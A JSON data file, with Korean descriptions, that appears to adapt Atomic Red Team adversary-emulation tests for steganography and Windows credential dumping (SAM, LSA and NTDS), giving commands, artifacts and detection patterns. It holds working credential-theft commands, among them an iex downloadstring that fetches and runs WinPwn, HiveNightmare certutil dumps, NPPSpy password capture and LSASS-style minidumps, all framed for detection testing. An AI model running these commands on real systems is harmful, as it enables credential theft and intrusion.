[
{
  "technique_id": "T1001.002",
  "technique_name": "Data Obfuscation via Steganography",
  "tactic": "Command and Control",
  "description": "이미지, 오디오 등의 파일에 데이터를 숨겨 통신 내용을 난독화하는 기법이다. 공격자는 파일 전송이나 웹 요청처럼 보이도록 위장해 명령·제어 트래픽이나 유출 데이터를 숨길 수 있다. 전통적인 보안 장비는 정상 멀티미디어 파일로 인식해 탐지가 어려워지며, 네트워크·콘텐츠 분석을 함께 해야 한다.",
  "tests": [
    {
      "test_id": "T1001.002-1",
      "name": "Steganographic Tarball Embedding",
      "platforms": [
        "windows"
      ],
      "summary": "이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 생성한다.",
      "procedure": [
        "지정된 경로에 테스트용 이미지 파일이 존재하는지 확인하고, 없으면 원격 저장소에서 다운로드한다.",
        "랜덤 패스워드를 여러 개 생성해 텍스트 파일(<passwords_file>)로 저장한다.",
        "<passwords_file>을 포함하는 tarz/tar 아카이브(<tar_file>)를 생성한다.",
        "원본 이미지(<image_file>)와 tar 파일(<tar_file>)을 바이트 단위로 읽어 이어붙이고, 새 이미지(<new_image_file>)로 저장한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte"
        }
      ],
      "prerequisites": [
        "테스트에 사용할 이미지 파일(<image_file>)이 존재해야 한다. 없으면 원격 URL에서 다운로드해 준비한다.",
        "랜덤 패스워드를 생성해 <passwords_file>에 저장해야 한다.",
        "<passwords_file>을 포함하는 tarz/tar 아카이브(<tar_file>)가 생성되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\random_passwords.txt",
            "description": "랜덤으로 생성된 여러 개의 패스워드를 저장한 텍스트 파일"
          },
          {
            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
            "description": "패스워드 텍스트 파일을 포함하는 tarz/tar 아카이브"
          },
          {
            "path": "%PUBLIC%\\Downloads\\T1001.002New.jpg",
            "description": "tar 아카이브가 은닉된 새 이미지 파일(스테가노그래피 적용 결과)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg",
            "description": "데이터 은닉에 사용되는 원본 이미지 파일"
          },
          {
            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
            "description": "이미지에 삽입되는 tarz/tar 아카이브 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "이미지와 tar 파일을 바이트 단위로 처리해 새 이미지를 생성하는 데 사용된 PowerShell",
            "commandline_pattern": "Get-Content * -Encoding byte -ReadCount 0 | Set-Content *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 후 새로 생성된 이미지 파일(<new_image_file>)을 삭제해 은닉 데이터를 제거할 수 있다.",
        "테스트용 tarz/tar 파일(<tar_file>)과 패스워드 파일(<passwords_file>)을 삭제해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "c7921449-8b62-4c4d-8a83-d9281ac0190b",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1001/002/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1001.002"
        ]
      }
    },
    {
      "test_id": "T1001.002-2",
      "name": "Embedded Script in Image Execution via Extract-Invoke-PSImage",
      "platforms": [
        "windows"
      ],
      "summary": "악성 PowerShell 스크립트를 이미지 파일에 숨긴 뒤, Extract-Invoke-PSImage 스크립트를 사용해 내용을 추출·디코딩하고 실행하는 과정을 시뮬레이션한다. 결과적으로 정상적인 이미지처럼 보이는 파일을 통해 숨겨진 명령(Start-Process notepad)을 실행한다.",
      "procedure": [
        "테스트에 사용할 악성 이미지(<image_file>)와 Extract-Invoke-PSImage 스크립트(<psimage_script>) 존재 여부를 확인한다.",
        "필요 시 원격 GitHub 저장소에서 이미지와 Extract-Invoke-PSImage.ps1을 다운로드해 준비한다.",
        "Extract-Invoke-PSImage 모듈을 로드하고, 이미지에서 숨겨진 PowerShell 스크립트를 추출해 result.ps1로 저장한다.",
        "result.ps1에서 base64 인코딩된 페이로드를 추출해 디코딩하고 decoded.ps1 및 textExtraction.ps1로 저장한다.",
        "최종 추출된 textExtraction.ps1 스크립트를 실행하여 내장된 명령(Start-Process notepad)을 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"; Import-Module .\\Extract-Invoke-PSImage.ps1; $extractedScript = Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"; $scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw; $base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"; $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }; $base64Strings | Set-Content \"$HOME\\decoded.ps1\"; $decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent)); $textPattern = '^.+'; $textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }; $scriptPath = \"$HOME\\textExtraction.ps1\"; $textMatches -join '' | Set-Content -Path $scriptPath; . \"$HOME\\textExtraction.ps1\""
        }
      ],
      "prerequisites": [
        "악성 이미지 파일(<image_file>)이 존재해야 한다. 없으면 지정된 GitHub URL에서 다운로드한다.",
        "Extract-Invoke-PSImage.ps1 스크립트(<psimage_script>)가 존재해야 한다. 없으면 ExternalPayloads 디렉터리에 다운로드한다.",
        "PathToAtomicsFolder 및 ExternalPayloads 경로가 올바르게 설정되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$HOME\\result.ps1",
            "description": "Extract-Invoke-PSImage를 통해 이미지에서 추출된 원본 PowerShell 스크립트"
          },
          {
            "path": "$HOME\\decoded.ps1",
            "description": "result.ps1에서 추출한 base64 문자열을 저장한 파일"
          },
          {
            "path": "$HOME\\textExtraction.ps1",
            "description": "base64 디코딩 후 실제 실행 가능한 PowerShell 명령이 포함된 스크립트"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg",
            "description": "숨겨진 PowerShell 페이로드가 포함된 악성 이미지 파일"
          },
          {
            "path": "PathToAtomicsFolder\\ExternalPayloads\\Extract-Invoke-PSImage.ps1",
            "description": "이미지에서 스크립트를 추출하는 데 사용되는 도구 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "이미지에서 스크립트를 추출·디코딩하고 최종 페이로드를 실행하는 데 사용된 PowerShell",
            "commandline_pattern": "Extract-Invoke-PSImage -Image *; *FromBase64String*; textExtraction.ps1"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 악성 이미지 및 Extract-Invoke-PSImage 스크립트를 다운로드하는 HTTP/HTTPS 통신 가능성"
          }
        ]
      },
      "cleanup": [
        "테스트 후 $HOME\\result.ps1, $HOME\\decoded.ps1, $HOME\\textExtraction.ps1 파일을 삭제해 스크립트 흔적을 제거할 수 있다.",
        "다운로드한 악성 이미지 파일과 Extract-Invoke-PSImage.ps1 스크립트도 필요 시 삭제해 환경을 원복할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "04bb8e3d-1670-46ab-a3f1-5cee64da29b6",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1001/002/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1001.002"
        ]
      }
    }
  ]
}
,
{
  "technique_id": "T1003",
  "technique_name": "OS Credential Dumping",
  "tactic": "Credential Access",
  "description": "운영체제에서 계정 자격 증명(해시, 평문 비밀번호 등)을 덤프해 탈취하는 기법이다.",
  "tests": [
    {
      "test_id": "T1003-1",
      "name": "Gsecdump",
      "platforms": ["windows"],
      "summary": "Gsecdump 도구를 사용해 메모리에서 계정 자격 증명과 해시를 덤프한다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"#{gsecdump_exe}\" -a"
        }
      ],
      "artifacts": {
        "files": [
          "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe (자격 증명 덤프 도구)"
        ],
        "registry": [],
        "processes": [
          "gsecdump.exe (메모리에서 크리덴셜 덤프)"
        ],
        "network": [
          "https://web.archive.org/.../gsecdump-v2b5.exe (도구 다운로드)"
        ]
      },
      "tags": {
        "action": ["process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping"]
      }
    },
    {
      "test_id": "T1003-2",
      "name": "Credential Dumping with NPPSpy",
      "platforms": ["windows"],
      "summary": "NPPSpy 네트워크 프로바이더 DLL을 등록해 로그인 시 평문 비밀번호를 C:\\NPPSpy.txt에 기록한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\""
        }
      ],
      "artifacts": {
        "files": [
          "C:\\Windows\\System32\\NPPSPY.dll",
          "C:\\NPPSpy.txt (로그인 시 저장된 평문 비밀번호)"
        ],
        "registry": [
          "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order",
          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider"
        ],
        "processes": [
          "powershell.exe (DLL 복사 및 레지스트리 조작)"
        ],
        "network": [
          "https://github.com/gtworek/PSBits/.../NPPSPY.dll (DLL 다운로드)"
        ]
      },
      "tags": {
        "action": ["file_create", "registry_modification", "process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NetworkProvider_Hijack"]
      }
    },
    {
      "test_id": "T1003-3",
      "name": "Dump svchost.exe to gather RDP credentials",
      "platforms": ["windows"],
      "summary": "RDP 연결을 처리하는 svchost.exe 프로세스를 MiniDump 해 TEMP 경로에 svchost-exe.dmp를 생성한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } ; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full"
        }
      ],
      "artifacts": {
        "files": [
          "%TEMP%\\svchost-exe.dmp (svchost 메모리 덤프)"
        ],
        "registry": [],
        "processes": [
          "powershell.exe (Get-NetTCPConnection 및 MiniDump 호출)",
          "rundll32.exe (comsvcs.dll MiniDump)"
        ],
        "network": [
          "TCP 3389 (RDP Established 세션이 있을 수 있음)"
        ]
      },
      "tags": {
        "action": ["process_start", "memory_dump"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "RDP_Credential_Dump"]
      }
    },
    {
      "test_id": "T1003-4",
      "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)",
      "platforms": ["windows"],
      "summary": "IIS appcmd.exe list 옵션으로 애플리케이션 풀 정보를 조회해 서비스 계정 자격 증명을 확인한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*"
        }
      ],
      "artifacts": {
        "files": [],
        "registry": [],
        "processes": [
          "appcmd.exe (IIS 애플리케이션 풀 나열)",
          "powershell.exe (appcmd 호출)"
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "WebService_Credential_Enumeration"]
      }
    },
    {
      "test_id": "T1003-5",
      "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)",
      "platforms": ["windows"],
      "summary": "appcmd.exe list apppool /config 명령으로 IIS 애플리케이션 풀 전체 구성을 덤프해 서비스 계정 정보를 확인한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config"
        }
      ],
      "artifacts": {
        "files": [],
        "registry": [],
        "processes": [
          "appcmd.exe (애플리케이션 풀 구성 덤프)",
          "powershell.exe (appcmd /config 호출)"
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "WebService_Credential_Enumeration"]
      }
    },
    {
      "test_id": "T1003-6",
      "name": "Dump Credential Manager using keymgr.dll and rundll32.exe",
      "platforms": ["windows"],
      "summary": "rundll32.exe로 keymgr.dll의 KRShowKeyMgr를 호출해 Credential Manager UI를 띄우고 자격 증명을 내보낼 수 있게 한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "rundll32.exe keymgr,KRShowKeyMgr"
        }
      ],
      "artifacts": {
        "files": [
          "*.crd (Credential Manager 내보내기 파일, 경로는 사용자 지정)"
        ],
        "registry": [],
        "processes": [
          "rundll32.exe (keymgr,KRShowKeyMgr 호출)"
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "credential_export"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "Credential_Manager_Export"]
      }
    },
    {
      "test_id": "T1003-7",
      "name": "Send NTLM Hash with RPC Test Connection",
      "platforms": ["windows"],
      "summary": "rpcping 유틸리티로 RPC 테스트 연결을 보내면서 NTLM 인증을 강제로 수행하게 한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null"
        }
      ],
      "artifacts": {
        "files": [],
        "registry": [],
        "processes": [
          "rpcping.exe (RPC 테스트 및 NTLM 인증 유도)",
          "powershell.exe (rpcping 호출)"
        ],
        "network": [
          "RPC/NTLM 트래픽 (server_ip:custom_port 로 향하는 테스트 연결)"
        ]
      },
      "tags": {
        "action": ["process_start", "network_connection"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTLM_Hash_Exposure"]
      }
    }
  ]
},
{
  "technique_id": "T1003.002",
  "technique_name": "OS Credential Dumping: Security Account Manager",
  "tactic": "Credential Access",
  "description": "SAM, SYSTEM, SECURITY 레지스트리 하이브를 덤프하거나 복사해 로컬 계정 해시·캐시 크리덴셜·LSA 시크릿을 추출하는 기법이다. 볼륨 섀도 카피, 레지스트리 백업/익스포트, 전용 도구(pypykatz, WinPwn 등)를 통해 비관리자 계정까지 크리덴셜 노출로 이어질 수 있다.",
  "tests": [
    {
      "test_id": "T1003.002-1",
      "name": "Registry dump of SAM, creds, and secrets",
      "platforms": ["windows"],
      "summary": "reg save를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp% 경로로 저장해 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg save HKLM\\sam %temp%\\sam\r\nreg save HKLM\\system %temp%\\system\r\nreg save HKLM\\security %temp%\\security"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%temp%\\sam",
            "description": "SAM 하이브 백업"
          },
          {
            "path": "%temp%\\system",
            "description": "SYSTEM 하이브 백업"
          },
          {
            "path": "%temp%\\security",
            "description": "SECURITY 하이브 백업"
          }
        ],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\sam",
            "description": "로컬 SAM 데이터"
          },
          {
            "path": "HKLM\\system",
            "description": "시스템 구성 및 부트 키 정보"
          },
          {
            "path": "HKLM\\security",
            "description": "LSA 시크릿을 포함한 보안 관련 정보"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "레지스트리 하이브를 파일로 저장하는 도구",
            "commandline_pattern": "reg save HKLM\\* %temp%\\*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["registry_export", "file_create"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
      }
    },
    {
      "test_id": "T1003.002-2",
      "name": "Registry parse with pypykatz",
      "platforms": ["windows"],
      "summary": "pypykatz를 파이썬 가상환경에서 실행해 LSASS/LSA 관련 레지스트리 하이브를 파싱하고 저장된 크리덴셜을 추출하는 시나리오다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002",
            "description": "pypykatz 실행에 사용되는 Python 가상환경(기본값 venv_path)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "pypykatz",
            "description": "LSA/LSASS 관련 데이터를 파싱해 크리덴셜을 추출하는 도구",
            "commandline_pattern": "pypykatz live lsa"
          }
        ],
        "network": [
          {
            "description": "선행 단계에서 Python 인스톨러 및 pypykatz 패키지 다운로드를 위한 HTTP/HTTPS 트래픽 발생 가능"
          }
        ]
      },
      "tags": {
        "action": ["process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "LSA_Secrets_Dump"]
      }
    },
    {
      "test_id": "T1003.002-3",
      "name": "esentutl.exe SAM copy",
      "platforms": ["windows"],
      "summary": "esentutl.exe와 VSS를 이용해 SAM 하이브 파일을 복사한다. 기본값 기준 %SystemRoot%\\system32\\config\\SAM을 %temp%로 복사해 해시 추출에 사용한다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{copy_dest}\\#{file_name}",
            "description": "VSS를 통해 복사된 SAM 하이브(기본값: %temp%\\SAM)"
          }
        ],
        "files_read": [
          {
            "path": "%SystemRoot%\\system32\\config\\SAM",
            "description": "원본 SAM 하이브 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "esentutl.exe",
            "description": "VSS 기반으로 하이브/파일을 복사하는 유틸리티",
            "commandline_pattern": "esentutl.exe /y /vss *SAM*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["file_copy", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
      }
    },
    {
      "test_id": "T1003.002-4",
      "name": "PowerDump Hashes and Usernames from Registry",
      "platforms": ["windows"],
      "summary": "Invoke-PowerDump.ps1 스크립트를 로드해 레지스트리에서 해시와 사용자 정보를 읽어오는 PowerDump 기반 해시덤프 시나리오다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"; Invoke-PowerDump"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1",
            "description": "원격 GitHub에서 다운로드된 PowerDump PowerShell 스크립트"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "PowerDump 모듈을 로드하고 Invoke-PowerDump를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "Import-Module *PowerDump.ps1*; Invoke-PowerDump"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 Invoke-PowerDump.ps1를 다운로드하는 HTTP/HTTPS 트래픽"
          }
        ]
      },
      "tags": {
        "action": ["script_download", "process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "Registry_Hashdump"]
      }
    },
    {
      "test_id": "T1003.002-5",
      "name": "dump volume shadow copy hives with certutil",
      "platforms": ["windows"],
      "summary": "HiveNightmare/SeriousSAM 취약점을 악용해 certutil로 볼륨 섀도 카피에서 SAM 등 하이브를 덤프하고 %temp%에 저장하는 비관리자 계정 기반 시나리오다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%temp%\\#{target_hive}vss*",
            "description": "각 섀도 카피에서 certutil로 덤프한 대상 하이브의 헥스 인코딩 파일"
          }
        ],
        "files_read": [
          {
            "path": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\#{target_hive}",
            "description": "섀도 카피에 있는 대상 하이브(SAM 등)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "certutil.exe",
            "description": "섀도 카피에서 하이브 파일을 인코딩·덤프하는 유틸리티",
            "commandline_pattern": "certutil -f -v -encodehex *HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["file_create", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "HiveNightmare", "SAM_Dump"]
      }
    },
    {
      "test_id": "T1003.002-6",
      "name": "dump volume shadow copy hives with System.IO.File",
      "platforms": ["windows"],
      "summary": "PowerShell의 System.IO.File.Copy를 이용해 볼륨 섀도 카피에서 SAM 등 하이브를 $env:TEMP로 복사하는 HiveNightmare 기반 시나리오다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "1..#{limit} | % { try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {} ; ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore }"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:TEMP\\#{target_hive}vss*",
            "description": "System.IO.File.Copy를 사용해 각 섀도 카피에서 복사된 하이브 파일"
          }
        ],
        "files_read": [
          {
            "path": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\#{target_hive}",
            "description": "섀도 카피 내 대상 하이브 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "System.IO.File.Copy로 섀도 카피 하이브를 TEMP로 복사하는 PowerShell",
            "commandline_pattern": "[System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\*\", \"$env:TEMP\\*vss*\""
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["file_create", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "HiveNightmare", "SAM_Dump"]
      }
    },
    {
      "test_id": "T1003.002-7",
      "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
      "platforms": ["windows"],
      "summary": "WinPwn.ps1을 원격에서 로드해 samfile 함수로 SAM 파일을 덤프하고 NTLM 해시를 수집하는 로컬 크리덴셜 루팅 시나리오다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn 스크립트를 다운로드·로드한 뒤 samfile 함수를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn*'); samfile -consoleoutput -noninteractive"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 WinPwn.ps1를 다운로드하는 HTTP/HTTPS 트래픽"
          }
        ]
      },
      "tags": {
        "action": ["script_download", "process_start"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
      }
    },
    {
      "test_id": "T1003.002-8",
      "name": "Dumping of SAM, creds, and secrets (Reg Export)",
      "platforms": ["windows"],
      "summary": "reg export를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp%로 내보내 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg export HKLM\\sam %temp%\\sam\r\nreg export HKLM\\system %temp%\\system\r\nreg export HKLM\\security %temp%\\security"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%temp%\\sam",
            "description": "reg export로 생성된 SAM 하이브 백업"
          },
          {
            "path": "%temp%\\system",
            "description": "reg export로 생성된 SYSTEM 하이브 백업"
          },
          {
            "path": "%temp%\\security",
            "description": "reg export로 생성된 SECURITY 하이브 백업"
          }
        ],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\sam",
            "description": "로컬 SAM 데이터"
          },
          {
            "path": "HKLM\\system",
            "description": "시스템 구성 및 부트 키 정보"
          },
          {
            "path": "HKLM\\security",
            "description": "LSA 시크릿을 포함한 보안 관련 정보"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "레지스트리 키를 파일로 내보내는 도구",
            "commandline_pattern": "reg export HKLM\\* %temp%\\*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["registry_export", "file_create"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
      }
    }
  ]
},
{
  "technique_id": "T1003.003",
  "technique_name": "OS Credential Dumping: NTDS",
  "tactic": "Credential Access",
  "description": "도메인 컨트롤러에서 NTDS.dit(Active Directory 데이터베이스)와 SYSTEM 하이브를 볼륨 섀도 카피(VSS)·NTDSUtil·WMI 등을 통해 복사하거나 덤프해 도메인 계정 자격 증명을 탈취하는 기법이다.",
  "tests": [
    {
      "test_id": "T1003.003-1",
      "name": "Create Volume Shadow Copy with vssadmin",
      "platforms": ["windows"],
      "summary": "도메인 컨트롤러에서 vssadmin.exe를 사용해 지정 드라이브(C:)의 볼륨 섀도 카피를 생성한다. 이후 NTDS.dit와 SYSTEM 하이브를 섀도 카피에서 복사해 도메인 크리덴셜을 덤프하는 전 단계로 사용된다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "vssadmin.exe create shadow /for=#{drive_letter}"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "vssadmin.exe",
            "description": "지정 드라이브에 대한 볼륨 섀도 카피를 생성",
            "commandline_pattern": "vssadmin.exe create shadow /for=*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-2",
      "name": "Copy NTDS.dit from Volume Shadow Copy",
      "platforms": ["windows"],
      "summary": "이미 존재하는 볼륨 섀도 카피에서 NTDS.dit와 SYSTEM 하이브를 복사하고, 현재 HKLM\\SYSTEM 하이브를 reg save로 내보내 도메인 크리덴셜 복호화에 필요한 재료를 모두 수집한다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\r\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\r\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{extract_path}\\ntds.dit",
